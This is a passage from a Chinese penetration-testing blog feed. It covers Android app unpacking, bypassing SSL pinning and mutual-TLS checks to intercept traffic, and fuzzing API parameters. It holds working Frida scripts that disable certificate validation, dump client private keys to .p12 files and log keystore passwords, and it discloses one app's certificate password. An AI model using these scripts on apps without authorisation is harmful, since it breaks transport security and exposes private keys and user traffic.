class="string">&#x27;||var|if|path||int|function|so|fd|Module|pathptr|new|indexOf|pointer|ptr|getExportByName|libc|NativeFunction|args|null|log|symbol_name|console|chmod|addr_DefineClass|cPath|is_hook_libart|libart|base|mkdir|symbol|close|index|Memory|process_name|dex_count|Process|can_hook_libart|this|readCString|true|dump_dex|dex|dex_path|onLeave|allocUtf8String|undefined|open|dex_file|symbols|pointerSize|dex_maps|retval|dex_dir_path|closedir|buffer|dir|result|opendir|size|return|attach|read|onEnter|Interceptor|opendirPtr|readPtr|mkdirPtr|closedirPtr|chmodPtr|closePtr|755|0x1000|dlopen|findExportByName|magic|openPtr|get_self_process_name|add|data|android_dlopen_ext|address|dex_buffer|DefineClass|flush|wb|write|readByteArray|self|cmdline|setImmediate|proc|false|dump|alloc|hook_dlopen|length|for|enumerateSymbols|name|DexFile|Thread|ClassLinker|findModuleByName|File|class|files|find|readPointer|readUInt|dump_dex_&#x27;</span>.<span class="title function_">split</span>(<span class="string">&#x27;|&#x27;</span>),<span class="number">0</span>,&#123;&#125;))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081405023.png" alt="img"> </p><p>该脚本来源网络，能解决部分加固如360、腾讯、xxx等，就一个字：吊</p><h3 id="六、网址：最终万能方案"><a href="#六、网址：最终万能方案" class="headerlink" title="六、网址：最终万能方案"></a>六、网址：最终万能方案</h3><p> 网址：<strong><a href="https://nop.gs/">https://nop.gs</a></strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/2167914/1728215249898-cd0ffa6f-ba3c-4200-ab5b-d93382b433a2.png" alt="img"> </p><p>APK无脑上传即可，除了脱不了的都是脱得了的✌，可以说非常万能。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 脱壳 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>app三种常见抓包场景及案例分析</title>
      <link href="/2024/10/08/app%E4%B8%89%E7%A7%8D%E5%B8%B8%E8%A7%81%E6%8A%93%E5%8C%85%E5%9C%BA%E6%99%AF%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/"/>
      <url>/2024/10/08/app%E4%B8%89%E7%A7%8D%E5%B8%B8%E8%A7%81%E6%8A%93%E5%8C%85%E5%9C%BA%E6%99%AF%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>以下文章来源于：<a href="https://mp.weixin.qq.com/s/vUSNcshhuVWd7tWlw2qdbQ">https://mp.weixin.qq.com/s/vUSNcshhuVWd7tWlw2qdbQ</a>    【看雪学苑】</p><h1 id="一、未校验：配置证书就能抓"><a href="#一、未校验：配置证书就能抓" class="headerlink" title="一、未校验：配置证书就能抓"></a>一、未校验：配置证书就能抓</h1><p>1、这种情况是最简单的情况，Android 7.0之前的设备，直接配置用户证书，就能进行抓包，Android 7.0之后的设备，需要获取root权限1后，把用户证书移到系统证书目录下，或者配置系统强制信任用户证书。</p><ul><li><p>对于移动用户证书到系统证书目录下的情况，推荐使用这个插件：</p><p><a href="https://github.com/ys1231/MoveCertificate">https://github.com/ys1231/MoveCertificate</a></p></li><li><p>对于强制信任用户证书的这种情况，推荐使用这个插件：</p><p><a href="https://github.com/NVISOsecurity/MagiskTrustUserCerts">https://github.com/NVISOsecurity/MagiskTrustUserCerts</a></p></li></ul><p>2、对于这种情况，我们安装完证书后，直接使用代理&#x2F;vpn的方式进行抓包就可以了，这里我们以某浏览器为例，进行抓包演示，因为我用的设备是Android 7.0以上的，所以我们首先是配置系统强制信任用户证书的插件。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081014296.png" alt="img"> </p><p>3、配置完成后，我们在抓包软件上导出证书，然后在设备上进行安装。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081014554.webp" alt="img"> </p><p>4、接下来，我们就可以进行抓包了，抓包成功。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081015707.webp" alt="img"> </p><h1 id="二、单向证书认证-客户端校验服务端证书（SSLPinning）"><a href="#二、单向证书认证-客户端校验服务端证书（SSLPinning）" class="headerlink" title="二、单向证书认证-客户端校验服务端证书（SSLPinning）"></a>二、单向证书认证-客户端校验服务端证书（SSLPinning）</h1><p>1、这是第二种情况，也就是我们常说的sslpinning，想具体了解sslpining技术，可以去看这2篇文章：<br><a href="https://shunix.com/ssl-pinning/">https://shunix.com/ssl-pinning/</a><br><a href="https://yu-jack.github.io/2020/03/02/ssl-pinning/">https://yu-jack.github.io/2020/03/02/ssl-pinning/</a></p><p>2、针对这种情况，我们以x答x单app为例，进行抓包，上面我们已经试过了，用我们的测试设备是可以正常抓到https的数据包的，然后我们再去抓一下x答x单这个app的包，点击发送验证码按钮后会提示发送失败，请重试 ，说明我们抓包失败了。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081016912.webp" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081017982.webp" alt="img"> </p><p>3、这里报错：Client closed the connection before a request was made. Possibly the SSL certificate was rejected，表明在 SSL&#x2F;TLS 握手阶段，客户端在没有发送 HTTP 请求之前就关闭了连接，客户端拒绝了服务器的证书，也就是上面我们所说的sslpinning技术，还有另外一种报错得情况：SSL handshake with client failed: An unknown issue occurred processing the certificate (certificate_unknown)，也是用到了sslpinning技术。那遇到上述这2种情况，我们应该怎么处理呢？使用frida进行hook，我们这里直接用大佬们写好的脚本进行hook，地址：<a href="https://github.com/WooyunDota/DroidSSLUnpinning/blob/master/ObjectionUnpinningPlus/hooks.js">https://github.com/WooyunDota/DroidSSLUnpinning/blob/master/ObjectionUnpinningPlus/hooks.js</a></p><p>4、用了大佬的脚本后，发现还是不行，还是失败了，只能换一个再试试了，又尝试了justtrustme，地址：<a href="https://github.com/Fuzion24/JustTrustMe%EF%BC%8C%E7%BB%93%E6%9E%9C%E8%BF%98%E6%98%AF%E4%B8%8D%E8%A1%8C%E3%80%82">https://github.com/Fuzion24/JustTrustMe，结果还是不行。</a></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081024431.webp" alt="img"> </p><p>5、在辗转反侧之时，我想起之前用算法助手时，里面带着一个justtruatme的升级版，于是就拿来试了试，结果成功拿下。可以正常进行抓包了。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081024359.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081024428.webp" alt="img"> </p><p>6、经过上述尝试，我们针对sslpinning这种，可以先用市面上已有的sslunpinning工具进行尝试，如果遇到都无法进行成功的情况，那就需要我们去手工进行hook了。大致有两种思路，<strong>一是</strong>对所有HTTP字符串相关类进行Hook，<strong>二是</strong>考虑到App在验证证书时会打开证书文件判断是否是App自身所信任的，因此一定会使用File类的构造函数打开证书文件获得文件的句柄，所以我们在测试时可以Hook上所有File类的构造函数，即对<strong>File.init函数进行hook。这里我用了objection进行hook的</strong>：<code>**objection -N -h 127.0.0.1 -p 26666 -g cn.ticktick.task explore -P ~/.objection/plugins -s &quot;android hooking watch class_method java.io.File.\init --dump-args --dump-backtrace --dump-return&quot;**</code>，这里因为$在命令行中有特殊含义，所以用\对它进行转义，避免被当成命令行变量。hook之后，我们在得到的数据里面搜索&#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081057026.webp" alt="img"> </p><p>7、我们在搜到的数据里面，找到了一个关于证书的堆栈信息，我们用jadx反编译后，找到这个方法：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081057217.webp" alt="img"> </p><p>8、复制一下，丢给chatgpt分析一下，得出结论，这段代码是关于处理 SSL 证书验证的逻辑，是基于域名和证书的哈希值进行匹配，检查传入的证书是否符合某些预期的标准，那我们尝试hook它，并让它返回空，这样不就能绕过证书校验了嘛。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">function <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  Java.perform(function()&#123;</span><br><span class="line">    console.log(<span class="string">&quot;启动&quot;</span>);</span><br><span class="line">    <span class="type">let</span> <span class="variable">f</span> <span class="operator">=</span> Java.use(<span class="string">&quot;ll.f&quot;</span>);</span><br><span class="line">    f[<span class="string">&quot;a&quot;</span>].implementation=function(str, list)&#123;</span><br><span class="line">      console.log(`f.a is called: str=$&#123;str&#125;, list=$&#123;list&#125;`);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line">setTimeout(main,<span class="number">500</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081058519.webp" alt="img"> </p><p>9、非常幸运，经过hook后，我们成功抓到了这个数据包，至此完成。</p><h1 id="三、双向证书校验-服务器校验客户端证书"><a href="#三、双向证书校验-服务器校验客户端证书" class="headerlink" title="三、双向证书校验-服务器校验客户端证书"></a>三、双向证书校验-服务器校验客户端证书</h1><p>双向证书校验 &#x3D; 客户端校验服务端证书+服务端校验客户端证书</p><p>1、这是第三种情况，我们以x利蜂app为例，进行抓包尝试，经过尝试，还是和之前一样报错：SSL handshake with client failed: An unknown issue occurred processing the certificate (certificate_unknown)</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081100379.webp" alt="img"> </p><p>2、我们先使用objection的android sslpinning disable把这个sslpinning过掉，过掉之后，我们再抓包，发现请求正常发出，响应返回报错：400 No required SSL certificate was sent。判断为服务器校验客户端证书。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081100391.webp" alt="img"> </p><p>3、当我们遇到这种情况，需要我们从app中找到内置的客户端证书，导入到抓包工具中，才能正常进行抓包，那怎么才能找到客户端的证书呢？通常是有二种方法，第一种是用r0ysue大佬写的r0capture进行hook导出，第二种是去hook Keystore，找到加载证书的地方，手动分析源码去找到证书和密码。我们先用一下第一种方案：直接上r0capture，有枣没枣打一杆子试试。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081101423.webp" alt="img"> </p><p>4、运气不错，证书找到了，我们直接在dowload目录下把证书拿出来，安装到Charles里。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081101548.webp" alt="img"> </p><p>5、然后，再次进行抓包，可以看到，我们成功绕过了双向证书认证。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081101165.webp" alt="img"> </p><p>6、我们去看一下r0ysue大佬的脚本，简单来解释一下原理：</p><p>在安卓开发中，系统包是无法混淆的，例如java.security.KeyStore不会被混淆，所以可以去hook这个类，并且在 Java 中，KeyStore$PrivateKeyEntry 是存储在 KeyStore 中，包含私钥和响应的证书，即getPrivateKey() 和 getCertificateChain() 这两个方法，也就是说当应用程序调用 getPrivateKey() 或 getCertificateChain() 方法来获取私钥和证书时，会被脚本拦截并提取返回的私钥和证书数据，然后storeP12() 函数，将提取的私钥和证书组合起来，存储为一个 .p12 文件，并使用密码r0ysue进行加密并写入到指定路径。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">   <span class="keyword">function</span>  <span class="title function_">uuid</span>(<span class="params">len, radix</span>)&#123;</span><br><span class="line">       <span class="keyword">var</span> chars =<span class="string">&#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#x27;</span>.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">       <span class="keyword">var</span> uuid =[], i;</span><br><span class="line">        radix = radix || chars.<span class="property">length</span>;</span><br><span class="line">       <span class="keyword">if</span>(len)&#123;</span><br><span class="line">           <span class="comment">// Compact form</span></span><br><span class="line">           <span class="keyword">for</span>(i =<span class="number">0</span>; i &lt; len; i++) uuid[i]= chars[<span class="number">0</span>| <span class="title class_">Math</span>.<span class="title function_">random</span>()* radix];</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="comment">// rfc4122, version 4 form</span></span><br><span class="line">           <span class="keyword">var</span> r;</span><br><span class="line">           <span class="comment">// rfc4122 requires these characters</span></span><br><span class="line">            uuid[<span class="number">8</span>]= uuid[<span class="number">13</span>]= uuid[<span class="number">18</span>]= uuid[<span class="number">23</span>]=<span class="string">&#x27;-&#x27;</span>;</span><br><span class="line">            uuid[<span class="number">14</span>]=<span class="string">&#x27;4&#x27;</span>;</span><br><span class="line">           <span class="comment">// Fill in random data. At i==19 set the high bits of clock sequence as</span></span><br><span class="line">           <span class="comment">// per rfc4122, sec. 4.1.5</span></span><br><span class="line">           <span class="keyword">for</span>(i =<span class="number">0</span>; i &lt;<span class="number">36</span>; i++)&#123;</span><br><span class="line">               <span class="keyword">if</span>(!uuid[i])&#123;</span><br><span class="line">                    r =<span class="number">0</span>| <span class="title class_">Math</span>.<span class="title function_">random</span>()*<span class="number">16</span>;</span><br><span class="line">                    uuid[i]= chars[(i ==<span class="number">19</span>)?(r &amp;<span class="number">0x3</span>)|<span class="number">0x8</span>: r];</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> uuid.<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">function</span>  <span class="title function_">storeP12</span>(<span class="params">pri, p7, p12Path, p12Password</span>)&#123;</span><br><span class="line">       <span class="keyword">var</span> X509Certificate = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.security.cert.X509Certificate&quot;</span>)</span><br><span class="line">       <span class="keyword">var</span> p7X509 = <span class="title class_">Java</span>.<span class="title function_">cast</span>(p7, X509Certificate);</span><br><span class="line">       <span class="keyword">var</span> chain = <span class="title class_">Java</span>.<span class="title function_">array</span>(<span class="string">&quot;java.security.cert.X509Certificate&quot;</span>,[p7X509])</span><br><span class="line">       <span class="keyword">var</span> ks = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.security.KeyStore&quot;</span>).<span class="title function_">getInstance</span>(<span class="string">&quot;PKCS12&quot;</span>,<span class="string">&quot;BC&quot;</span>);</span><br><span class="line">        ks.<span class="title function_">load</span>(<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">        ks.<span class="title function_">setKeyEntry</span>(<span class="string">&quot;client&quot;</span>, pri, <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(p12Password).<span class="title function_">toCharArray</span>(), chain);</span><br><span class="line">       <span class="keyword">try</span>&#123;</span><br><span class="line">           <span class="keyword">var</span> out = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.io.FileOutputStream&quot;</span>).$new(p12Path);</span><br><span class="line">            ks.<span class="title function_">store</span>(out, <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(p12Password).<span class="title function_">toCharArray</span>())</span><br><span class="line">       &#125;<span class="keyword">catch</span>(exp)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(exp)</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">     <span class="comment">// 在服务器校验客户端的情形下，帮助dump客户端证书，并保存为p12的格式，证书密码为r0ysue</span></span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.security.KeyStore$PrivateKeyEntry&quot;</span>).<span class="property">getPrivateKey</span>.<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">       <span class="keyword">var</span> result =<span class="variable language_">this</span>.<span class="title function_">getPrivateKey</span>()</span><br><span class="line">       <span class="keyword">var</span> packageName = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.app.ActivityThread&quot;</span>).<span class="title function_">currentApplication</span>().<span class="title function_">getApplicationContext</span>().<span class="title function_">getPackageName</span>();</span><br><span class="line">       <span class="title function_">storeP12</span>(<span class="variable language_">this</span>.<span class="title function_">getPrivateKey</span>(),<span class="variable language_">this</span>.<span class="title function_">getCertificate</span>(),<span class="string">&#x27;/sdcard/Download/&#x27;</span>+ packageName +<span class="title function_">uuid</span>(<span class="number">10</span>,<span class="number">16</span>)+<span class="string">&#x27;.p12&#x27;</span>,<span class="string">&#x27;r0ysue&#x27;</span>);</span><br><span class="line">       <span class="keyword">return</span> result;</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.security.KeyStore$PrivateKeyEntry&quot;</span>).<span class="property">getCertificateChain</span>.<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">       <span class="keyword">var</span> result =<span class="variable language_">this</span>.<span class="title function_">getCertificateChain</span>()</span><br><span class="line">       <span class="keyword">var</span> packageName = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.app.ActivityThread&quot;</span>).<span class="title function_">currentApplication</span>().<span class="title function_">getApplicationContext</span>().<span class="title function_">getPackageName</span>();</span><br><span class="line">       <span class="title function_">storeP12</span>(<span class="variable language_">this</span>.<span class="title function_">getPrivateKey</span>(),<span class="variable language_">this</span>.<span class="title function_">getCertificate</span>(),<span class="string">&#x27;/sdcard/Download/&#x27;</span>+ packageName +<span class="title function_">uuid</span>(<span class="number">10</span>,<span class="number">16</span>)+<span class="string">&#x27;.p12&#x27;</span>,<span class="string">&#x27;r0ysue&#x27;</span>);</span><br><span class="line">       <span class="keyword">return</span> result;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>7、这个x利蜂的例子到此为止，我们再拿出某Location，它也是双向证书认证，这次我们自己去找一下证书，还是一样启动charles进行抓包。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081102509.webp" alt="img"> </p><p>8、可以看到，报错和之前是一样的，我们之前说过了，这种是sslpinning的情况，我们用objection的android sslpinning disable把它过掉，过掉之后，再重新抓包，发现报错变了，请求包正常，响应包400的情况。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081102305.webp" alt="img"> </p><p>9、这种情况就是双向证书校验了，我们需要去解包找证书搜索.p12，.bks，.pem，还是一样没找到，我们只能去脱壳反编译代码，这次脱壳我用的是大佬给分享的一个脱壳网站：<a href="https://nop.gs/">https://nop.gs/</a></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081102604.webp" alt="img"> </p><p>10、然后我们去代码里找找看，这里我们直接搜索keystore，发现就这几个，而且就这俩货带着BKS的关键字样。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081103329.webp" alt="img"> </p><p>11、点进去看看，终于知道为啥我解包后，搜索常见证书后缀搜不着的原因了，原来是用了图片做证书。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081103499.webp" alt="img"> </p><p>12、证书找到了，接下来就是找密码了，怎么找呢？当然是hook了，上脚本。之前也说过了，因为java.security.KeyStore是系统的类是不会被混淆的，所以我们hook它就行了。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_KeyStore_load</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">       <span class="keyword">var</span> <span class="title class_">StringClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line">       <span class="keyword">var</span> <span class="title class_">KeyStore</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.security.KeyStore&quot;</span>);</span><br><span class="line">        <span class="title class_">KeyStore</span>.<span class="property">load</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.security.KeyStore$LoadStoreParameter&#x27;</span>).<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params">arg0</span>)&#123;</span><br><span class="line">           <span class="comment">// printStack(&quot;KeyStore.load1&quot;);</span></span><br><span class="line">           <span class="comment">// 输出调用栈</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new()));</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;KeyStore.load1:&quot;</span>, arg0);</span><br><span class="line">           <span class="variable language_">this</span>.<span class="title function_">load</span>(arg0);</span><br><span class="line">       &#125;;</span><br><span class="line">        <span class="title class_">KeyStore</span>.<span class="property">load</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.io.InputStream&#x27;</span>,<span class="string">&#x27;[C&#x27;</span>).<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params">arg0, arg1</span>)&#123;</span><br><span class="line">           <span class="comment">// printStack(&quot;KeyStore.load2&quot;);</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new()));</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;KeyStore.load2:&quot;</span>, arg0, arg1 ? <span class="title class_">StringClass</span>.$new(arg1):<span class="literal">null</span>);</span><br><span class="line">           <span class="variable language_">this</span>.<span class="title function_">load</span>(arg0, arg1);</span><br><span class="line">       &#125;;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hook_KeyStore_load...&quot;</span>);</span><br><span class="line">   &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">hook_KeyStore_load</span>()</span><br></pre></td></tr></table></figure><p>13、来，让我们来看看hook的效果如何？hook出来了，密码是lerist.key.2021。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081103334.webp" alt="img"> </p><p>14、然后我们把证书拿出来。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081104580.webp" alt="img"> </p><p>15、这里我用了keystore explorer对证书进行格式的转换。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081104281.webp" alt="img"> </p><p>16、我们得把证书转成p12格式，才能在charles里安装，安装完成后，虽然是加密得，但是可以正常抓包了。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081104880.webp" alt="img"> </p><h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h1><p>在Android应用的抓包过程中，处理不同类型的证书验证机制的方法有所不同：</p><ul><li><p>无证书校验：如果应用没有进行证书验证，我们只需配置抓包工具的证书即可进行抓包。</p></li><li><p>单向证书认证（SSL Pinning）：对于SSL Pinning的应用，我们通常需要使用Frida等工具进行hook，以绕过SSL Pinning机制。在某些情况下，可能需要尝试多种方法，如使用JustTrustMe脚本，才能成功进行抓包。</p></li><li><p>双向证书认证：对于双向证书认证，我们可以使用r0capture直接dump证书。此外，也可以通过代码中找到证书和密码，然后将其转换为.p12证书，并导入到抓包工具中进行抓包。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 抓包 </tag>
            
            <tag> Android </tag>
            
            <tag> Frida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>src-渗透中应该如何寻找参数的蛛丝马迹</title>
      <link href="/2024/09/22/%E6%B8%97%E9%80%8F%E4%B8%AD%E5%BA%94%E8%AF%A5%E5%A6%82%E4%BD%95%E5%AF%BB%E6%89%BE%E5%8F%82%E6%95%B0%E7%9A%84%E8%9B%9B%E4%B8%9D%E9%A9%AC%E8%BF%B9/"/>
      <url>/2024/09/22/%E6%B8%97%E9%80%8F%E4%B8%AD%E5%BA%94%E8%AF%A5%E5%A6%82%E4%BD%95%E5%AF%BB%E6%89%BE%E5%8F%82%E6%95%B0%E7%9A%84%E8%9B%9B%E4%B8%9D%E9%A9%AC%E8%BF%B9/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>文章来源于：<a href="https://mp.weixin.qq.com/s/pgJbSV0lJ7umdYomNV1xbQ">https://mp.weixin.qq.com/s/pgJbSV0lJ7umdYomNV1xbQ</a></p><p>以下文章来源于HW专项行动小组 ，作者L@2uR1te</p><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>平常在做测试的时候，拿到站点前期最终的一个事情，就是找一下前端JS中是不是有一些敏感的接口，看看是不是有未授权和敏感信息泄露的问题。但是，只是找到接口，将对应接口和域名拼接大多数情况下都是返回405或者报错的。这是因为，需要接口的调用是需要参数的。但在很多情况下，JS中是不会将参数和接口一一对应写好的。所以，我们对接口的测试一个绕不开的问题就是——我们应该如何寻找参数的蛛丝马迹？</p><h2 id="0x02-找不到参数-痛苦面具"><a href="#0x02-找不到参数-痛苦面具" class="headerlink" title="0x02 找不到参数~痛苦面具"></a>0x02 找不到参数~痛苦面具</h2><p>开始之前还是先来看看找不到参数是怎样的情况。我们来模拟一下平时测试的流程。</p><p>我们找到了一个接口，先以GET去访问。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221801295.png" alt="image.png"> </p><p>一般会提示405，或者回显GET not supported，就是请求方式不对。那我们改成POST或者其它请求方式试试。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221801157.png" alt="image.png"> </p><p>此时，如果出现415错误，或者回显<code>application/x-www-form-urlencoded Not supported</code>，那就需要换一下Content-Type，绝大部分情况下，只需要改成<code>application/json</code>，并加上json请求体即可，极少数情况下遇到过xml传参。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221802352.png" alt="image.png"> </p><p>然后？然后就没有然后了，这下，从响应中我们并不能推断出自己下一步要干什么，当然这里还有可能出现各种奇奇怪怪的异常和回显，比如参数缺失、参数验证失败等等</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221802938.png" alt="image.png"> </p><p>总之，我们应该怎么去寻找参数呢？</p><h2 id="0x03-基于心善的开发者寻找参数"><a href="#0x03-基于心善的开发者寻找参数" class="headerlink" title="0x03 基于心善的开发者寻找参数"></a>0x03 基于心善的开发者寻找参数</h2><p>在正式开始介绍寻找参数的方法之前，我们来介绍另一种情况。那就是在一部分情况下，你调用一个接口并且没有传入参数，好心的开发者会告诉你缺了什么参数，对JAVA开发比较熟悉的小伙伴都知道，在Spring中有一个@Validated验证注解，可以和@NotNull、@NotBlank等注解一起使用，去判断参数是否为空，并返回一些信息：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221803798.png" alt="image.png"> </p><p>比如这里就对UserDTO做了一个绑定，然后在UserDTO中就可以判断某个属性是否为空，这里可以注意到，判断之后还可以返回message。因此如果开发者好心，这个地方会抛出一些UserDTO中的属性名。这样我们就知道要传入什么参数了：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221803630.png" alt="image.png"> </p><p>例如下面这样：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221804061.png" alt="image.png"> </p><p>有时候后端虽然给我们抛出了参数信息，但可能是和异常堆栈或者其他错误信息一起给出的，并不能一眼看出需要的参数，这时候需要细心。这个也算是经常遇到的情况。</p><p>这种一般有三种情况，<strong>一种</strong>是后端一个个抛出缺失的参数，比如我们加一个A参数，后端告诉我们缺了B参数，我们再补一个B参数，后端又告诉我们缺了C参数…以此类推。<strong>另一种</strong>则是后端一口气告诉缺了A、B、C参数。上述这两种都属于对攻击者很友好的，<strong>第三种情况</strong>相对没那么友好，那就是后端只模糊的说了一下需要的参数的含义，比如我下面这个接口：</p><p><a href="http://api.test.com/api/getuserinfo">http://api.test.com/api/getuserinfo</a></p><p>访问后端提示，缺少用户id。这种时候我们虽然不知道参数的具体值，但是是能很大程度上缩小范围的，比如如下几个常见的用户id参数：</p><p>id、userid、user_id、uid、userId等</p><p>部分功能的接口的参数名也相对比较固定，比如文件上传接口，文件上传表单的参数名一般就是file或者files，实际上通过观察接口名字，能够推断出它要实现的是什么功能，是针对什么对象实现的，有时候确实能推断出一些参数。</p><p>那么回归正题，上面我们介绍了开发者心善，赏安全从业者饭吃的场景，在上述情况下我们可以快速而精确地获取到缺失的参数名。这实际上都算不上寻找参数，因为对面已经告诉我们了。那我们就假设一个最严峻的场景，后端就是没有任何提示，严格遵循上文演示过的情况，我们又应该怎么办呢？</p><h2 id="0x04-通过常规参数字典进行参数名FUZZ"><a href="#0x04-通过常规参数字典进行参数名FUZZ" class="headerlink" title="0x04 通过常规参数字典进行参数名FUZZ"></a>0x04 通过常规参数字典进行参数名FUZZ</h2><p>在上述情况下，第一个比较常规的搞法就是参数名FUZZ</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221805280.png" alt="image.png"> 